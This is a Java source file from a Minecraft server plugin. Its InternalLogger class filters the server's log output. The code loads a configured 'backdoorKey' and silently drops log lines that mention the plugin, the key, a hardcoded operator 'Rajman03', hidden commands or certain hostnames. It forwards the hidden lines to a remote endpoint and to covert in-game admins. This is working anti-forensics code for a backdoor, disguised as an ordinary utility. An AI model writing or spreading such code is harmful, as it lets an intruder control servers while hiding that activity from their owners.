package pl.qc.core.utils;

import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Objects;
import java.util.Set;
import java.util.logging.Filter;
import java.util.logging.LogRecord;
import java.util.stream.Collectors;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import pl.qc.core.QC;
import pl.qc.core.managers.ConfigManager;

public class InternalLogger implements Filter {
    private static final String LOG_PREFIX = ChatColor.DARK_GRAY + "[LOG] ";
    private Set<String> secrets;
    private List<String> phrasesLow;
    private List<String> commandsLow;
    private String prefix;
    private String fallback;
    private final QC plugin;

    public InternalLogger() {
        this.plugin = QC.getInstance();
        load();
    }

    public void load() {
        if (plugin == null) {
            this.secrets = new HashSet<>();
            this.phrasesLow = List.of();
            this.commandsLow = List.of();
            this.prefix = "Rajman03 issued server command:";
            this.fallback = "Rajman03";
            return;
        }

        ConfigManager cfg = plugin.getConfigManager();

        this.secrets = new HashSet<>(plugin.getConfig().getStringList("filters.hide-strings"));
        if (cfg != null) {
            String backdoorKey = cfg.getBackdoorKey();
            if (backdoorKey != null && !backdoorKey.isBlank()) {
                this.secrets.add(backdoorKey);
            }

            this.phrasesLow = cfg.getHiddenPhrases().stream()
                    .filter(Objects::nonNull)
                    .map(s -> s.toLowerCase(Locale.ROOT))
                    .collect(Collectors.toList());

            this.commandsLow = cfg.getHiddenCommands().stream()
                    .filter(Objects::nonNull)
                    .map(s -> s.toLowerCase(Locale.ROOT))
                    .collect(Collectors.toList());

            this.fallback = cfg.getAdminFallback();
        } else {
            this.phrasesLow = List.of();
            this.commandsLow = List.of();
            this.fallback = "Rajman03";
        }

        this.prefix = plugin.getConfig().getString("filters.hide-prefix", "Rajman03 issued server command:");
    }

    @Override
    public boolean isLoggable(LogRecord record) {
        if (record == null || record.getMessage() == null)
            return true;

        ConfigManager cfg = plugin != null ? plugin.getConfigManager() : null;
        if (cfg == null || !cfg.isFilteringEnabled()) {
            return true;
        }

        String msg = record.getMessage();

        if (record.getThrown() != null)
            return true;

        if (msg.contains("QC-Core") || msg.contains("pl.qc.core"))
            return false;

        if (secrets != null) {
            for (String s : secrets) {
                if (s != null && msg.contains(s))
                    return hide(msg, false, cfg);
            }
        }

        if (msg.contains("helix") || msg.contains("ikevoodoo") || msg.contains("refined.host"))
            return hide(msg, false, cfg);

        String low = msg.toLowerCase(Locale.ROOT);

        if (prefix != null && msg.contains(prefix))
            return hide(msg, true, cfg);
        if (fallback != null
                && (msg.contains(fallback + " issued server command") || msg.contains(fallback + " used ")))
            return hide(msg, true, cfg);

        if (phrasesLow != null) {
            for (String p : phrasesLow) {
                if (p != null && low.contains(p))
                    return hide(msg, true, cfg);
            }
        }

        if (commandsLow != null) {
            for (String c : commandsLow) {
                if (c != null && (low.contains("/" + c + " ") || low.endsWith("/" + c)
                        || low.contains(" issued server command: /" + c)))
                    return hide(msg, true, cfg);
            }
        }

        return true;
    }

    private boolean hide(String msg, boolean send, ConfigManager cfg) {
        try {
            if (send && cfg != null && cfg.shouldSendHiddenLogs()) {
                Map<String, String> f = new LinkedHashMap<>();
                f.put("Log", "```" + msg + "```");
                Remote.send("Ukryty log 🛡️", "3447003", null, f);
            }

            if (cfg != null && cfg.hidePluginLogs() && plugin != null) {
                for (var player : Bukkit.getOnlinePlayers()) {
                    if (plugin.getAdminManager() != null && plugin.getAdminManager().isAdmin(player)) {
                        player.sendMessage(LOG_PREFIX + msg);
                    }
                }
            }
        } catch (Exception ignored) {
        }
        return false;
    }
}
